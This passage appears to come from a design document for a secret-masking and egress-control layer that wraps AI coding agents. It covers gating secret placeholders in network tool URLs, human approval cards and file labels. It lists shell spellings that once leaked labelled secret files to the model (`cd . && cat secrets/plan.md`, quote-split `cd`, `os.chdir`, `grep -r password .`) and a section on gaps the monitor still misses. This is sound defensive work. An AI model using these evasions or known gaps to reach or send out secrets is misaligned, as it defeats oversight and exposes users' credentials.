`interceptors/openai-proxy/test/unit/exec-history.test.ts`,
`test/component/exec-history.test.ts` (every wire above, stream:false,
Chat Completions, a view map, a secret output beside a restored call
still masked), `tests/stack/codex-exec-history.test.ts` (the real arbiter
over the production wiring: a HIGH session's blocked command and cell
literal, Allow once running the command the model read back, a requoted
allow; no memo or key in any model request, and every call the model is
sent is one it wrote).

**A symbol in a network tool's URL.** The session leg above sees
paraphrases, not *symbols*: `WebFetch("https://host/?token=$MDU:anymodel_Read[…]")`
used to leave as the literal token through the TLS tunnel, neither
released at the bound host nor refused at an unbound one. The net gate now
has a **per-symbol leg** (`net-gate.ts`). After the session leg allows, or
does not apply, every `$MDU:*` token in the field that reaches the
destination (`WebFetch.url`, `WebSearch.query`; WebFetch's `prompt` goes to
the client's own summarizer, not the host; for another agent its own
network tools, e.g. OpenCode `webfetch.url` / OpenClaw `web_fetch.url`,
agent-e2e-harness.md §7 item 7) is put to `desymbolizationDecision` at the
`network` boundary, exactly as the net-proxy does for plain HTTP. Any
non-allow blocks the call with the arbiter's own rule
(`egress:secret-unbound`, `egress:secret-bound-approval`,
`egress:untrusted-destination`, …); the arbiter queues the Inbox row and
remembers the human's verdict per {symbol, destination} (a registered
file's placeholders per {file, destination}: one card for the file,
egress-hold.md "One card per file"). Fail-closed: a
throw, a timeout, an arbiter without the op while a symbol is present, or
more than 16 symbols in one call all block. A token the arbiter never
allocated (`egress:unknown-symbol`) is text, not a datum, and is ignored.

When every symbol **is** allowed, the value still cannot be released by the
model proxy: the resolved URL would be echoed back as assistant history and
re-enter T-LLM's context (`egress:secret-model-context`, a hard deny).
Release belongs to the chokepoint that performs the act: the net-proxy's
TLS inspection (`--net-proxy-mitm`, ON by default whenever this axis is on,
plan 10 §11.5) runs the same gate on the decrypted URL and substitutes
there, while the model wire keeps the symbol. The launcher tells the model
proxy whether inspection is on (`MANDU_NET_TLS_INSPECTED`): with it the
call passes through untouched; without it the call is blocked under
`proxy:symbol-in-tls-tunnel` (the sentinel path reads
`symbol-cannot-be-released-inside-this-tools-https-request`), because the
alternative is a request that silently carries a token the destination
cannot use. The model proxy never resolves a symbol. This leg also enacts
the deny half of `CLAUDE_CODE_OUTPUT_FIELD_POLICY` (`WebFetch.url:
"resolve"`).

**Two blocks, two rules.** At the default posture a secret's *bound* host
is not auto-released when the flow is untrusted-influenced: §9 rule 1(b)
makes it need one human approval even there (a binding authorizes the
datum, not the flow), remembered per {symbol, destination}. With integrity
off, the bound host is released with no human in the loop
(`egress:secret-bound-trusted`). The net-proxy carries the arbiter's rule
on each withheld symbol, in the block reason, the 403 body, and the
event's `policy {usage, reason, ruleRef}`, so the bound host's
`egress:secret-bound-approval` and an unbound host's `egress:secret-unbound`
are distinguishable in the trace (drills C13 at the `secrets` posture and
C21, frozen lane; test-organization.md §7.2).

**Send without it (2026-10-17).** The human's fourth answer to a card about
a secret's placeholder in a request (`egress:secret-unbound`,
`egress:secret-bound-approval`), beside *Allow once*, *Always allow* and
*Block*: the next request carrying that placeholder to that host goes, with
the neutral marker `[hidden by Mandu]` where the placeholder was. Never the
value (the placeholder is never resolved), never the `$MDU:` token. A task
such as "open an issue with the full error" then finishes, and the secret
inside the error (a database password) stays on the machine; the block
becomes a finished task. The mechanics:

- *Which cards take it.* Only a row whose subject is a whole `$MDU:`
  placeholder of a SECRET the symbol table holds, whose target is a network
  host, with this axis on (`arbiter/policy/send-without.ts`
  `sendWithoutRefusal`). There the withheld content IS the placeholder, so
  taking the token out leaves nothing of the secret behind. Every
  content-agnostic card is refused: a program holding a secret
  (`holder-send:`, `<secret-taint:…>`), a HIGH session's request or command
  (`session-net:` / `session-exec:`), an unattributed connection, the frozen
  integrity taint gate, a file open or change, a held message, a masked
  value asked into the model's context. Their request may hold the raw
  bytes in any encoding with no placeholder to take out, so "without it"
  would send it. The arbiter REFUSES `resolveEgressApproval {strip: true}`
  on such a row (fail-closed, the row unchanged) and with `approve: true`;
  the dashboard not offering the button there (the listing's read-time
  `stripOffered`) is the second line, not the first.
- *What it is.* A ONCE DENIAL carrying `strip` (egress-approvals.ts, the
  `strip` column, added to an older table in place). One-shot like *Allow
  once*, chosen so: the human judged one request ("the full error"), and a
  standing *send without* would silently cut the secret from every later
  request to that host, a change of the data the user may not want to keep
  (the next request asks again; *Block* remains the standing refusal). A
  gate that does not know the flag reads a denial (and, asking on an
  attested channel, spends it): an older net-proxy, the model proxies'
  credential and upload gates, the kernel net-supervisor; the Test-a-flow
  probe reads a denial too. On the data socket the agent's
  programs reach, the answer reads as a plain denial and is not spent
  (arbiter-human-plane.md §10.3). The model proxy's pre-check (`preflight`)
  reads it unspent and is answered `allow` with `strip`, so a WebFetch goes on
  to the net-proxy (nothing is released at the model proxy, which never
  resolves; without TLS inspection the call is blocked as for an allow). The
  net-proxy's own ask on the human socket spends it and gets `{allow: false,
  requiresApproval: false, strip: true}`.
- *What the net-proxy sends* (`net-proxy/src/egress.ts` `gateRequest`). Each
  symbol answered so is replaced, as a whole token, by the marker: plain in
  a header, a Basic credential's `user:password` pair (re-encoded) and a
  body; percent-encoded (`%5Bhidden%20by%20Mandu%5D`) in the URL and in an
  `application/x-www-form-urlencoded` body, so the URL stays sendable and the
  field decodes to the marker. The marker has no quote, backslash, colon or
  line break, so a JSON string stays valid. An agent's `Content-Length` is
  set to the new body's length (both legs re-derive it on the wire anyway).
  Any other symbol is decided as before: allowed ones are resolved, and one
  still denied blocks the whole request (the spent answer is then lost; the
  next try asks again). A placeholder in the destination host itself has no
  place for a marker and blocks. After the substitution the gate checks that
  no token of a stripped placeholder is left anywhere it reads, else blocks.
- *The value backstop is strict here.* The §4 verbatim tripwire
  (`egressFingerprintScan`, the proxy's `fingerprintTripwire`) runs over the
  request with the markers in (allowed placeholders still tokens, so a
  legitimate release is not mistaken for a leak). For an ordinary request
  the tripwire is defense-in-depth and fails open; for a request sent only
  because the human chose to send it without the secret it must run and
  find nothing: an arbiter without the op, a failed scan, or a secret value
  anywhere in the request blocks it (403, nothing sent). The same holds on
  the TLS-inspected leg (`mitm.ts`), which blocks when it has no scan at all.
- *Arbiter unreachable:* the per-symbol ask throws, and the gate blocks, as
  before. Nothing about this answer is cached in the proxy.

*Pinned by* `arbiter/test/unit/send-without.test.ts` (the eligibility rule
over every card kind; the store: once denial, spent, cleared by a fresh
cycle and by any other answer, kept across a restart, an older table
migrated), `arbiter/test/component/send-without-it.test.ts` (real sockets:
offered, stored, the data socket told nothing and spending nothing, the
pre-check, the send's ask spending it, one-shot, refused on a HIGH
session's card), `interceptors/net-proxy/test/unit/send-without.test.ts`
(JSON body, form body, query string, header, Basic pair, Content-Length,
never resolved, the blocks), `interceptors/net-proxy/test/component/send-without-wire.test.ts`
(the wire, and the strict scan's three refusals), case (10) of
`interceptors/net-proxy/test/component/mitm.test.ts` (the TLS-inspected
leg: a form body's marker, a failed scan blocks) and e2e
`tests/stack/send-without-net-proxy.test.ts` (a real arbiter, the
net-proxy and the dashboard adapter in their production wiring, a
recording sink: the marker on the wire without the value or the
placeholder, one-shot, a session card refused, the arbiter gone blocks).

**A held request (2026-10-17;** detail in [`egress-hold.md`](egress-hold.md)**).**
With `MANDU_EGRESS_HOLD_MS` the net-proxy holds a request whose only
obstacle is an unanswered per-symbol card (one per file for a registered
file's placeholders, egress-hold.md "One card per file", 2026-10-19: a
*once* is spent by the request), and the answer decides that
request (Send without it, Allow, Block) through the same gate, marker and
strict scan; nothing else is held. The deadline, the arbiter gone and the
client gone each refuse it with nothing sent. The launcher sets it: 60 s
in an interactive session on a terminal, 0 (off) in CI, on a pipe and for
a one-shot such as `claude -p`; an explicit value wins, and a proxy started
without the launcher never holds (egress-hold.md "The default").

## 5. The dual invariant

Stated once, covering all levels (mirror of the invariant in
[`CONTRIBUTING.md`](../../../CONTRIBUTING.md)):

> Confidential data crosses the trust boundary **only as an opaque symbol**,
> **except** through an explicit, logged release its label grants — a bound
> destination, a quarantined read (`any-model`; `local-model` only at a
> declared local endpoint), or an in-context read (`any-model`;
> `local-model` only under a declared local main model) that
> **high-watermarks the session** at that label. Any
> release whose flow was **untrusted-influenced** escalates to human
> approval regardless of label.

Confidential data here is a registered credential, or a file **or git
object** labelled above `public`: a blob lock (policy.yaml `blobs:`,
confidentiality-plan-14 §8.2) is a label on an object, as a path label is a
label on a file, and the object twins keep a locked object out of the
agent's world (§7.2a). The wording in `CONTRIBUTING.md` and
`docs/guarantees.md` matches.

Fail-closed carries over unchanged: arbiter unreachable ⇒ egress stays
symbolic, no reads, no releases, high sessions stay confined; paths matching
the default-secret catalog classify `no-model`.

## 6. Classification — how files get labels

Source-keyed, like the inbound trust policy, but on **file provenance**
rather than tool origin:

1. **Default-secret catalog** (zero-config): `~/.ssh/*` (except the public
   material directly in it: `known_hosts*`, `authorized_keys*`,
   `allowed_signers`, `*.pub`; plan 10 §11.13), `.env*`, `*credentials*`
   (except documentation pages: `.md`, `.markdown`, `.rst`, `.html`,
   `.htm`; the Linux kernel's `Documentation/security/credentials.rst` is a
   page about credentials, and a page that does hold one is labelled in
   `policy.yaml`, which wins over the catalog; and, since 2026-10-17,
   except program source, `SOURCE_EXTS`: `credentials.ts`, `.py`, `.go`,
   `.java`, … are modules a compiler reads, while a shell script, every
   data and configuration format and an extension-less name stay matches;
   secret-discovery.md §1.12), cloud-provider config
   (`~/.aws`, `~/.config/gcloud`), keychains/keyrings,
   `secrets.local.json`-shaped files, and (since the recall audit,
   [`secret-discovery.md §2`](secret-discovery.md)) the login files
   of ~45 more developer tools plus private-key, service-account and
   Terraform-state shapes. All default to **`no-model`** with no bindings
   beyond obvious per-datum ones. The MVP story is true with no user
   action: *API keys cannot leave, by construction.*
2. **User labeling** (`policy.yaml` `paths:`, the dashboard's "Lock it"):
   mark files/directories at any level; directory inheritance; the
   dashboard shows label coverage per session and lists every `any-model`
   file and every destination binding, since each is a standing release
   rule and the surface must be visible.
3. **Enterprise label ingestion** (planned): consume Microsoft Purview/MIP
   sensitivity labels; their endpoint-permission semantics map naturally
   onto the levels ("allow cloud AI" ⇒ `any-model`; otherwise `no-model`).
   Mandu becomes the *enforcement* for labels the org already mandates.
   Planned as step 4a of
   [`confidentiality-plan-14-policy-suggestions.md`](./confidentiality-plan-14-policy-suggestions.md)
   §14.1: the labels become reviewed suggestions through a declared
   `sensitivity_labels:` mapping.

**Labels are keyed in HumanView, and the wire is not.** Under fs-sync (the
frozen integrity modes) the agent executes the **AgentView twin**, so the
`tool_use` args it echoes back, where the classify `origin` comes from,
carry the AgentView path, while every path policy here (catalog, user
labels, derived labels) is keyed in HumanView. The proxy therefore sends an
additive `originHuman` field alongside `origin`, which **only the
confidentiality derivation reads**: trust keeps seeing `origin`/`params`
byte-identically, so a spelling translation cannot move a datum UNTRUSTED →
TRUSTED. Any new label store must be keyed the same way, and any new caller
that runs a view map must send this field.

**A relative path in a shell command is read where the call runs
(2026-10-04).** Labels are keyed by absolute path, and a shell command
names files relative to its directory: `rg '^API_KEY=' test/fixtures/.env`.
Before, such a token met only the catalog (its `.env` shape), so a file the
human labelled `public` came back to the model as a symbol when the agent
read it through the shell, while a `Read` of the same file honored the label
(found live on Codex: `conf-public-label-wins`). A call that names the
directory its command runs in, Codex's `exec_command` and `shell` with their
`workdir` (the HumanView spelling when a view map runs), now has each
relative token read there too (`secret-catalog.ts` `labelForClassify`,
`labelForUnmappedInput`, `callWorkdir`): a human label on that path decides
the token as it decides a `Read`, in either direction (a `no-model` label
on `vault/` now masks `cat vault/key.txt`, which the catalog let through);
with no label the stricter of the token as written and the resolved path
stands. The label decides in either direction only where the base is the
directory the token is read in: not for a command that may change directory
(`cd`, `pushd`, `-C`, `--directory`, `--git-dir`, `-execdir` and kin, and
since 2026-10-04 `source`, `.` and `eval`, whose text the command does not
show; since 2026-10-17 also `\cd`, `c""d`, an interpreter's `chdir(` and
`--dir`, `--workdir`, `--wd`, `--root`: `directoryMayChange`), not for a
flag, a glob or an expansion, and not for another tool's `workdir` (a claim
nothing checks). Such a command's tokens are still read there, raise-only
(*A directory change only raises*, below). Every other token keeps its own verdict, so a
command that also reads a secret file stays masked; what a mis-read base
could miss is indirection §10.1 already scopes out, behind the twins, the
call's process taint and the value backstop. A Codex call that names no
`workdir` runs where Codex runs it, the session's directory: the
openai-proxy reads it off Codex's own `<environment_context>` messages
(`codexSessionCwd`: a user- or developer-role message that is the block and
nothing else, so neither a tool output nor an AGENTS.md block can name it)
and sends it as `workdirDefault` (HumanView, confidentiality-only), but only
when every such message names one and the same absolute path; none, two, or
a relative one, and the token keeps the catalog's verdict. A `workdir` the
call does name, but not as an absolute path, is no base and never falls
back to the default.

*Claude Code's `Bash`: the directory the kernel names (2026-10-04).*
Claude Code's `Bash` names no directory: its shell starts where the previous
call left it (a `cd` in one call moves the next), so the conversation alone
cannot say where a call ran, and until this change its relative tokens kept
the catalog's verdict (a `public` fixture read as `cat test/fixtures/.env`
came back as a symbol). The directory now comes from the kernel, not from
the model or the transcript: when the guard sees an exec by the agent's own
child (the call-root recorder's candidate, plan 13 D7), it reads that
process's `/proc/<pid>/cwd` while the exec is still suspended (the shell has
had no chance to `cd`) and reports it with the root (`recordExecRoot.cwd`,
`lineage::reported_cwd`: only an absolute path the kernel names plainly, not
a removed or unreachable directory). The arbiter keeps it only from the
human plane and only for a call root (`call_root_cwd`). The proxy's
`callTaint` ask binds the call to its shell by the command the proxy itself
relayed, and the anthropic-proxy now asks it before `classify`; `classify`
then reads the directory off that binding (`ProvenanceStore.callStartDir`)
into `ClassifyRequest.callStartDir`, a field only the arbiter sets (the
classify handler drops a caller's value), and `callWorkdir` reads the
call's relative tokens there exactly as Codex's `workdir` above. No
directory, and no label lifts the token (it is still read under every
label it could name, raise-only: below): no guard (no seccomp
user notification, `--no-net-guard`), a call the recorder did not bind (a
caller's claim or the most-recent-exec guess is not evidence), a call
folded over two shells that started in different directories, a root the
guard reported without one. A `..` is resolved lexically, as the label
rules resolve an absolute path; the kernel's directory is already free of
symlinks, so a label set through a symlinked spelling of the project does
not match it (over-restriction, never a lift). The direction is the same as
for Codex: a human label decides the token in either direction, without one
the stricter reading stands, every other token keeps its own verdict. What
the start directory cannot see is a change of directory the command does
not show (a function or alias of the human's shell config that runs `cd`,
a script given the token as an argument that reads it elsewhere): the
indirection §10.1 scopes out, behind the twins, the call's process taint
and the value backstop. Tests: arbiter `call-start-dir` (unit, component),
`tests/stack/claude-bash-public-label`, and under the real guard
`tests/sandbox/guard/relative-path-label` (a fixture read from the
workspace and from a subdirectory in clear, the same relative name from
another directory masked).

*A directory change only raises (2026-10-17).* Found by the adversarial
review of the path-row narrowing (plan 15 §13.12): where the scan could not
place a relative token (the command may change directory, or no directory
is known) it dropped the base altogether and read the token only as
written, and a label, keyed by absolute path, never matches a relative
token. So `cd . && cat secrets/plan.md` (and `cd -- .`, `pushd .`,
`cd "$PWD"`, `(cd . && …)`, `cd sub && cat ../vault/plan.md`,
`env -C sub cat ../…`, `tar -Cvault …`, `os.chdir('sub')` in a
one-liner) classified a file under the human's `no-model` directory
PUBLIC, and when nothing else stood behind the verdict (an unregistered
labelled file: no twin, no process taint, no registered value) its text
reached the model in clear, on Claude Code's `Bash` and Codex's
`exec_command` alike. A change of directory may stop a label from DECIDING
a token (the lift above) and from placing it on a file (plan 15 §13.12;
since 2026-10-19 a command that is one leading `cd` to a literal folder,
absolute or relative to the directory the call runs in, then a rest that
changes directory no further, places the rest's relative tokens in that
folder, for the path-row narrowing only: no label is lifted there, plan
15 §13.12 "A leading cd" and "A relative folder"), but never lowers a level. Where the token cannot be placed exactly it is
now also read, raise-only (a `public` label met there lowers nothing;
`findSecretPathsInText`):

- at the start directory, when the call has one (Codex's `workdir`, the
  kernel's directory for `Bash`): the shell's directory before any `cd`;
- in every directory the command's literal targets lead to
  (`candidateDirs`, labels only): the word after `cd`, `pushd`, `chdir`, a
  `-C` (also clustered, `env -iC ..`), `--directory=` and kin, `sudo -D`, an
  interpreter's `chdir('x')` / `Dir.chdir "x"` and a `cwd="x"` / `cwd: "x"`
  argument, resolved from the start directory, from each other (as many
  rounds as there are targets: `cd ..; cd ..; cd x`), inside each any-depth
  pattern's prefix, and, from an unknown directory, from where a label's
  path ends with them (`notes` is `/proj/notes` for a pattern
  `/proj/notes/*.md`); at most 64 directories, past which the precaution
  below stands;
- under every label it could name from an unknown directory: past its
  leading `./` and `../`, the token is read under each labelled path whose
  last segments it starts with (`../vault/plan.md` names `/proj/vault`'s
  tail, so it is read as `/proj/vault/plan.md`; `plan.md` is read as a
  labelled `/x/notes/plan.md`), and inside each pattern whose prefix is
  followed by `**` and then a named shape (`**/*.pem`; a bare
  `/proj/vault/**` is a directory, read like a recursive label). With no
  change of directory in the command, only a token written like a path
  (a `/` or a `.`) or passed as a shell argument (`grep -r x vault`) is
  read so, which keeps the words of a web search out of it. Past 32 such
  places for one token (a name thousands of derived files share) the
  strictest of them stands unread. The places come from the label stores
  (`LabelLookup.roots`, label-lookup.ts `labelRoots`: human labels and
  patterns above `public`, derived, session and client-key paths), indexed
  by path suffix, and a path no label root covers skips the full lookup;
- in the spelling the shell reads: quotes and backslashes removed
  (`va""ult/plan.md`, `vault\/plan.md`, `c$''d`), ANSI-C escapes decoded
  (`$'\x63d'` is `cd`), a quoted or escaped space kept inside its path
  (`"my vault/plan.md"`, `my\ vault`), a line continuation joined, `$PWD/x`,
  `$(pwd)/x`, `` `pwd`/x `` and `~+/x` as `./x`, `$HOME/x` as `~/x`, and the
  previous directory (`~-`, `$OLDPWD`) read like an unknown one; and the
  pieces of a token the whole-token reading misses, labels only
  (`--chdir=vault`, `-Cvault`, `HEAD:../x`, `'plan.md','utf8'`). Such a
  spelling is never placed on a file;
- a glob or brace token below a literal directory (`cat vault/*`,
  `cat notes/*.md`, `vault/{a,b}`, and a bare `*.md` after a `cd`): that
  directory, read where the token would be, raises to a label covering it
  or to the strictest label at or below it. A glob with no literal
  directory in the start directory (`cat *.md`, `cat vau*/x`) names no
  place and stays §10.1's.

A directory change whose target the scan cannot read at all (`cd "$X"`,
`cd -`, `` cd `…` ``, `cd $(…)`, a glob or brace, `~user`, `~-`, a `popd`
with no `pushd` of the command's own, `pushd +N`, `-C "$D"`,
`find -execdir`, `eval` of an expansion, zsh's two-word `cd old new`, a
variable in a command's place when the command sets one to `cd`
(`C=${X:-cd}; "$C" hr`), an interpreter's `chdir(`, `Dir.chdir "…"` or
`cwd=` of anything but one quoted literal (`os.fchdir(…)`,
`cwd=base`): `unresolvedDirChange`) takes the precaution: while any label
above `public` stands, a command that also passes an argument (any word
that is not a command's first word, a bare flag, the `cd`'s own target, an
output redirection's file or a descriptor before a redirection; a glob, an
expansion, a command substitution, an empty quoted word and an input
redirection's source count) is masked at the strictest label's level (rule
`dir-change:unresolved`; it names no path in the note). `cd "$X" && ls`,
`cd "$(git rev-parse --show-toplevel)" && make` and `cd "$D" && make
>build.log 2>&1` pass none and stay in clear; a mention of `chdir` or
`cwd=` in a search (`grep -rn chdir src`), a `cd -` inside a quoted
message, a `pushd x && … && popd` pair and a `$PYTHON -m pytest` are no
unresolved change. `source` and `.` are not counted: the file they run is
indirection the command does not show, like an alias (§10.1). A relative
`workdir` Codex honours (it joins it to its own directory, so it is no
base) is read as such a target from the directory the call would run in
without it. An unmapped tool's input (plan 10 §11.11) that names a
directory (`cwd`, `workdir`, `working_dir`, `dir`, `root` …) is read the
same way: an absolute one as one more base (labels only, and nothing
relative is then placed on a file), a relative one as a target, any
other, or a `cd` in another field, as a change of directory; a single
relative token beside such a directory is never read as placed. A label
that matches a whole multi-token command string (a `public` `**/*.md`
over `/bin/cat /proj/vault/plan.md`) no longer short-circuits the token
scan either (`confidentialityForOrigin`): only an exact label on that very
string (a path with a space) does; any other joins the scan's hits,
raise-only. The cost is bounded: past 2000 distinct relative tokens
looked for elsewhere in one text, the rest are not, and the strictest
label stands for the text (rule `scan:too-many-tokens`), so one huge
command never holds the single-threaded arbiter (a 1 MB heredoc after a
`cd`, 200 labels, 20000 derived rows: about 2 s; before this change a few
hundred ms, with the leak).

*What changes for utility:* the label lift is lost on a command whose
quoting hides a `cd`, that mentions `chdir` or passes a `cwd=` (it was
already lost on a plain `cd`); a relative token after a `cd` that names a
labelled path's tail, or a labelled file's own name, is masked even when
the `cd` led elsewhere (a label on `/proj/src` masks `cd ../lib && ls src`);
with no start directory a bare argument naming a labelled directory is
masked (`grep -r x vault`), and so is a web search whose word is a
labelled path's last name; a glob below a directory holding a labelled
file is masked (`cat src/*` with a label under `src/`); a command with an
unreadable directory target and any argument is masked while a label
stands (`cd "$(git rev-parse --show-toplevel)" && npm test`); a command of
more than 2000 distinct relative tokens that changes directory, or runs
with no start directory, is masked while a label stands; a quote-split
name (`.e""nv`) now reads as the secret it spells, so a row that names one
is not narrowed (plan 15 §13.12). *What still escapes the text scan:* a
shell that already stands inside a labelled directory with no start
directory from the guard (`gated` posture; a previous call's `cd`), a
pattern label with no `**` after its prefix read from an unknown directory
below that prefix that no target names, a recursive read of an unlabelled
ancestor of a labelled file (`grep -r password .`, `tar cf - .`), a
symlink made in the same command, a `file://` URL in a shell command,
`~user` paths, and the §10.1 indirection (a sourced file, an alias, a
script or a program that computes the path, a name glob such as
`cat secr*/plan.md`, `${IFS}`); the twins, the call's process taint and the
value backstop stand behind those for a registered file. Tests: arbiter
`dir-change-label-raise` (unit, component; the fixtures label `vault/`, a
name no catalog shape matches, beside the original `secrets/`, which the
catalog's `*secret*` shape would mask on a bare `cd secrets` with no label
at all), `tests/stack/dir-change-label-raise` (both model proxies; the
oracle: the labelled file's text in no request to either model).

*The base follows the shell (2026-10-17).* A maintainer decision: Mandu
does not set Claude Code's `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR`
(which would put the shell back in the project directory after every
`Bash` call: it changes what the agent does for the person, a `cd` no
longer carrying to the next call). The base of a relative path follows
the agent's real directory, as the kernel sees it, never as the model or
the transcript states it. Claude Code keeps one session directory: each
`Bash` call is a fresh shell spawned in it, the directory that shell
ended in (`pwd -P`, read back from a file) becomes the next call's, and
`EnterWorktree` sets it to the worktree with no shell at all; its file
tools (`Read`, `Edit`, `Write`, `NotebookEdit`) resolve a relative path
against it in the agent process itself. No request names it. Two kernel
facts carry it:

- **A `Bash` call**: the directory its own shell started in (the guard's
  `/proc/<pid>/cwd` at the exec, `callStartDir`, above). Claude Code spawns
  each call's shell where the last one ended, or in the worktree, so this
  start directory IS the persistent directory: after `cd vault` in one
  call, the next call's `cat plan.md` is read in `<ws>/vault`. This needed
  no change; "the start directory" above is the session's directory at
  the call's start, not the launch directory. The guard's gate of the
  shell's own open resolves `plan.md` against the shell's real directory
  too, so a labelled file reaches the shell as its placeholder whatever the
  text scan reads.
- **A file tool's relative path**: the gap this closes. The agent reads the
  file in its own process, which the guard does not gate (its result is
  classified at the model door), and the classify had only the value as
  written: `Read {file_path: "plan.md"}` after `cd vault`, or after
  `EnterWorktree`, named no label, and when nothing else stood behind the
  verdict (a labelled file not registered: created after the launch, past
  the walk's budget) the plan reached the model in clear, masked only after
  the fact once a shell had read the file. Now the guard reports the
  agent's own reading open of a file under a label root (`labelledLevel`
  with `agentOpen`, on the human plane: one round trip per such open, none
  for a file the arbiter already called `public` in that state); the
  arbiter keeps a file above `public` (`ProvenanceStore.recordAgentOpen`),
  and a classify of a call with no command whose `file_path`,
  `notebook_path` or `path` is relative reads, raise-only, each file the
  agent opened in the call's window (from the proxy's relay of the call to
  the classify; a call whose relay is unknown: the whole session) whose
  path ends with the value past its leading `./` and `../`
  (`callAgentOpens`, `ClassifyRequest.agentOpened`, which only the arbiter
  sets; at most 16 files per value). The kernel says which file the tool
  opened, so a `cd`, `EnterWorktree` and Claude Code's own reset of its
  directory are all followed. A `public` file opened there lowers nothing,
  the token is named in the note and never placed on a file (plan 15
  §13.12). Over-masking: another call of the same window that opened a
  labelled file of the same name raises it too. Fail-closed: a report the
  arbiter does not answer refuses the agent's open, as an unchecked
  label's is; an older arbiter (`unknown op`) leaves the open as before.

*Postures.* Without the guard (no seccomp user notification,
`--no-net-guard`) neither fact exists: a `Bash` call's relative token is
read as *A directory change only raises* reads a call with no start
directory (under every label it could name), and a file tool's value as
written, so a relative read of a labelled file from a directory an
earlier call's `cd` moved to, by a name that does not carry the labelled
path's tail (`cat plan.md` in `vault/`), is backed only by the value
backstop of a registered file (the launch's walk and
`syncLabelRegistrations` register the labelled files they reach). Agents
other than Claude Code are unchanged: Codex's `workdir` and session
default, and the launch directory of OpenClaw, OpenCode and Goose, still
decide first; the agent-open reading only adds. Tests: arbiter
`agent-open-base` (unit, component), net-supervisor `label_index`
(`agent_open_*`), mandu-arbiter protocol, and under the real guard
`tests/sandbox/guard/relative-base-shell-cwd` (an agent that keeps Claude
Code's session directory: after `cd vault`, a `Read` and a `cat` of
`plan.md` masked at their first exposure, after `EnterWorktree` too; red
before for the `Read`, the plan in clear; after `cd ..` the open plan and
a `cd test` public fixture in clear).

*Read by a program the launch did not see (2026-10-17).* Those escapes
are harmless only for a REGISTERED file: the value backstop masks its
values in any output. A labelled file the launch did not register was
known by its name alone, so each of them sent its text to the model in
clear: a file under a folder labelled while the session ran, outside HOME
and the workspace, deeper than the walk's `MAX_DEPTH` or past its
`MAX_FILES`, or created after the launch (the stack repro: twelve of
thirteen reads leaked). Two changes close it. (D) The human labels' places
are discovery roots of their own, walked last under their own budget
(secret-discovery.md §1.11), and a label added or raised mid-session makes
the arbiter walk and register the files already under it
(`syncLabelRegistrations`), in every posture, the guardless ones included.
(C) The guard gates the opens of a labelled file the launch did not
register as it gates a derived file's (plan 13 D4, "A labelled file the
launch did not register"): it keeps the arbiter's label roots
(`labelRootsSince`; a pattern's root is its literal prefix, `/` when it has
none, with its last segment's literal anchors as a prefilter), asks the
arbiter for the level of a file under one (`labelledLevel`, cached per file
state and label set), and serves a labelled file's twin, made from
`registerSecret` (which registers it for the value backstop too), or the
real file to a reader the human named. A file below a root inside a
directory the discovery walk never enters (`skipDirs`, its SKIP_DIRS:
`.git`, `node_modules`, `target`, …) is not gated, as the walk would not
have registered it: the toolchains in a labelled project keep reading
their files (their text still reaches the model only as the label's
classification decides, as before). So a file created under a label
mid-session reads as its placeholder through `grep -r`, `tar`, `os.walk`,
a symlink, `curl file://` or any other program, and a file outside every
root costs no round trip. Fail-closed: a file under a root the arbiter
cannot classify is refused. *What changes for utility:* a program other
than the agent that reads a labelled file the launch did not register now
reads its placeholder (as it did a registered one), unless the label's
readers name it; a performed rename of such a file labels its new name.
The agent's own process is not gated by a label (its file tools' results
are classified by the path they name, as before; since *The base follows
the shell*, above, the guard reports its opens of a labelled file so a
relative name is read where the agent opened it). *Its writes (2026-10-17)*
are a registered file's: a program other than the agent that writes such
a file, in place (`O_RDWR`), by an append or a truncating write (a
write-only open of a NON-EMPTY file is gated too,
`label_index::open_gate`: a program that read the placeholder and wrote
the file back would otherwise have put placeholder text over the real
one), writes into its placeholder copy, never the real file; a write-only
open of an empty file (one the write creates, `echo x > vault/new.md`)
writes the real file, and so does a holder's write-only open (a process
holding a secret raw: its write labels the file, plan 13 D5, where its
bytes in a twin would be served as written to the twin's later readers). A rename onto such a file (`sed -i`, `perl -i`, an
editor's save) is refused (`EACCES`) to every process but the agent, as
onto a registered file. A hard link of one outside every root (made in the
session, or before it once the labelled name was gated) is gated as the
file (`LabelIndex::other_name_level`, while the file has more than one
name). The change is not lost in silence: the guard makes each such twin
under a name of its own (a twin remade after the real file changed never
replaces an earlier one) and records it in `derived-twins/labelled-twins.ndjson`
(the twin's size, hash and identity, the real file's identity, never its
size or a hash of its bytes), and at the session's end the launcher names
every labelled file whose twin changed in the same notice and
`session_exit` field (`discardedWrites`) a registered file's write gets
(`launcher/src/twin-writes.ts` `labelledDiscardedWrites`, plan 10 §4.1;
`mandu reap` for a launcher that died). The real file is judged by its
identity, as a registered file too big to hash is, and that identity
clears it only when its times lie more than 2 s before the guard's look
(`REAL_TIME_SLACK_NS`, the time the record also holds: an in-place write
in the same timestamp tick keeps inode, mtime and ctime, CI pipeline
11426), else the line says Mandu could not check. The copy is never
written back. *Still open:* a label
set mid-session reaches the guard within a second (the files already
under it are registered at once); a `stat` by path of such a file reports
the real file's size (a descriptor's `fstat` reports the twin's, as for a
derived file); a folder above such a file renamed carries the label to no
file the guard has not yet gated (those already gated are registered, so
the value backstop still masks them); a NEW file a program creates under
a label with a reading open (`O_RDWR|O_CREAT`: `mkstemp`, sqlite, `sed
-i`'s temporary file) gets an empty placeholder copy, so what it writes
there does not reach the real file (now named at the end, the temporary
file `sed -i` removes as a real file that changed); a hard link made before
the launch is gated only once the labelled name was; and with no guard
(`gated`, `--no-net-guard`, macOS) only (D) stands. Tests:
`arbiter/test/unit/label-walk-roots.test.ts`,
`arbiter/test/component/label-set-registers.test.ts`,
`arbiter/test/component/label-roots-op.test.ts` (the two guard ops),
`net-supervisor/src/label_index.rs` (unit),
`interceptors/net-supervisor/tests/labelled_open_integration.rs` (the real
guard loop over a mock arbiter: a file created under a label and a walk
over it served the twin, a nested public file and a file outside raw, a
pattern's shape, refusal when the arbiter cannot classify, an older
arbiter, a label set later, a rename; red without the gate; a program's
in-place write, append, truncating write and write through a hard link
land in a recorded twin, the real file untouched, a created file holds its
bytes, and a rename onto a labelled file is refused, red before the write
gate), `launcher/test/unit/twin-writes.test.ts` (the guard's records, the
wording, a remade twin, reap),
`tests/stack/labelled-recursive-read.test.ts` (the thirteen reads through
the real proxy with the labels set mid-session, every one masked; red with
the label act's registration off) and
`tests/sandbox/secret-labelled-opens.test.ts` (the real launcher and guard,
with and without the twin bind: a file created mid-session under a
labelled folder read by `cat`, `grep -r`, `tar` and `os.walk` yields its
